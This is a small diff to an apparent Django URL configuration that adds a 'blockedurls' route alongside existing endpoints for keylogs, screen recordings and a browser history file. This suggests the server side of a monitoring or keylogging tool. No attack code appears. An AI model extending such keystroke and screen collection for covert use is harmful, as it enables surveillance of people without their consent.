@@ -5,4 +5,5 @@ urlpatterns = [
     path('keylogs/', views.getkeylogs, name='getkeylogs'),
     path('screenrecords/', views.getscreenrecords, name='getscreenrecords'),
     path('historyfile/', views.gethistory, name='gethistoryfile'),
+    path('blockedurls/', views.blocked_urls, name='getblockedurls'),
 ]
